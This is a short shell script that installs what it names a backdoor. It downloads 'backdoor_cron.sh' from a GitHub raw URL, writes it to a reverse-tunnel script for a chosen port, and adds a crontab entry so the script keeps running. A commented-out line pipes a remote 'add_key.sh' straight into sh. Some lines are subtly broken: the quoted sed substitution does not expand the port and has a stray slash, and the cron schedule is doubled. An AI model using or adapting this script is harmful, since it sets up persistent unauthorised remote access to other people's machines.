#!/bin/sh
if [ "$1" == "" ]; then
    echo "Missing argument port"
else
#    curl https://raw.githubusercontent.com/tpanum/sh/master/add_key.sh | sh
    curl https://raw.githubusercontent.com/tpanum/sh/master/scripts/backdoor_cron.sh > reverse_tunnel_port_$1.sh
    sed -i 's/{{@PORT}}/$1/g/' reverse_tunnel_port_$1.sh
    FILE=$(readlink -f reverse_tunnel_port_$1.sh)
    CRON_QUERY="*/5 * * * * $FILE"
    (crontab -l ; echo "0 * * * * $CRON_QUERY") | sort - | uniq - | crontab -
fi
